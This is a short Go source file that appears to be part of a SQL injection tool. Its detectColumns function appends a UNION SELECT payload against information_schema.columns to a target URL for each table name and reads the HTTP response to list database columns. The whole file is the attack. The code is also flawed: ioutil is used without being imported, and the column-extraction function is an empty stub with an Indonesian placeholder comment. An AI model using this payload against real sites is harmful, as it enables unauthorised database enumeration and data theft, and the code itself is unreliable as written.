package main

import (
	"fmt"
	"net/http"
)

func detectColumns(url string, tables []string) map[string][]string {
	columns := make(map[string][]string)
	for _, table := range tables {
		payload := fmt.Sprintf("' UNION SELECT column_name FROM information_schema.columns WHERE table_name='%s'-- ", table)
		target := fmt.Sprintf("%s%s", url, payload)

		resp, err := http.Get(target)
		if err != nil {
			fmt.Println("Error making request:", err)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			bodyString := string(bodyBytes)
			columns[table] = extractColumns(bodyString)
		}
	}

	return columns
}

func extractColumns(responseBody string) []string {
	columns := []string{}
	// Logika ekstraksi kolom sederhana dari responseBody
	return columns
}
